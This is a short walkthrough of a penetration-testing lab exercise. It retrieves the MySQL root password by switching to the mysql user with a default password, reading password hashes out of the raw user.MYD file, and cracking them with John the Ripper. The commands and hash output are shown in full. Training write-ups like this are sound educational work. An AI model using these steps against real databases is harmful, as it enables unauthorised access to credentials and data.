**GOAL**: To retrieve the key which is the password of the admin user in one of the local databases.

## Solution 
1. Logging into the system and trying the retreieve the key using previous steps doesn't work
2. So first we need to change ourselves to user `mysql` by using `su mysql` command and the password `mysql`
3. Once you gain access to the `mysql` user, you can try to attack the databse from the system instead of trying to attack it from inside the system.
4. For this we traverse to `/var/lin/mysql/mysql`
5. After this we can view the contents of `user.MYD` file, which would help us in getting the first part of the `root` password for `mysql`
6. From the contents of the `user.MYD` file, you get two seperate passwords which you need to combine in order to get a hash that can be cracked using `John-The-Ripper`
7. For this take the entire line of `root*..` and concatenate the numerical sequence just below the `debian-sys-maint..` with `root's` line
8. Use `root:<concatenated-string>` as a `username:hash` format and use `john` to crack the password.
9. Once cracked, use the password to login as a root user in mysql and retreive the key using the same steps used in previous exercises


## POC
```linux
pentesterlab@be12707f47f2:~$ ls
pentesterlab@be12707f47f2:~$ mysql -u mysql
ERROR 1045 (28000): Access denied for user 'mysql'@'localhost' (using pass
word: NO)
pentesterlab@be12707f47f2:~$ su mysql
Password: 
mysql@be12707f47f2:/home/pentesterlab$ cd /var/lib/mysql/mysql/
```

```linux
mysql@be12707f47f2:/var/lib/mysql/mysql$ ls
columns_priv.MYD   help_topic.MYD        slow_log.CSM
columns_priv.MYI   help_topic.MYI        slow_log.CSV
columns_priv.frm   help_topic.frm        slow_log.frm
db.MYD             host.MYD              tables_priv.MYD
db.MYI             host.MYI              tables_priv.MYI
db.frm             host.frm              tables_priv.frm
event.MYD          ndb_binlog_index.MYD  time_zone.MYD
event.MYI          ndb_binlog_index.MYI  time_zone.MYI
event.frm          ndb_binlog_index.frm  time_zone.frm
func.MYD           plugin.MYD            time_zone_leap_second.MYD
func.MYI           plugin.MYI            time_zone_leap_second.MYI
func.frm           plugin.frm            time_zone_leap_second.frm
general_log.CSM    proc.MYD              time_zone_name.MYD
general_log.CSV    proc.MYI              time_zone_name.MYI
general_log.frm    proc.frm              time_zone_name.frm
help_category.MYD  procs_priv.MYD        time_zone_transition.MYD
help_category.MYI  procs_priv.MYI        time_zone_transition.MYI
help_category.frm  procs_priv.frm        time_zone_transition.frm
help_keyword.MYD   proxies_priv.MYD      time_zone_transition_type.MYD
help_keyword.MYI   proxies_priv.MYI      time_zone_transition_type.MYI
help_keyword.frm   proxies_priv.frm      time_zone_transition_type.frm
help_relation.MYD  servers.MYD           user.MYD
help_relation.MYI  servers.MYI           user.MYI
help_relation.frm  servers.frm           user.frm
```

```linux
mysql@be12707f47f2:/var/lib/mysql/mysql$ strings user.MYD
        localhost
root*8246FACFAA53E9CFDCDEAEDA
6c732c6044b7
root
        127.0.0.1
root
root
        localhost
debian-sys-maint*D1461CE757B9B67AC344204A3A7FE9F9DB17A35C
15DA4067E4C55FBC
```

```linux
root*8246FACFAA53E9CFDCDEAEDA15DA4067E4C55FBC

debian-sys-maint*D1461CE757B9B67AC344204A3A7FE9F9DB17A35C
```
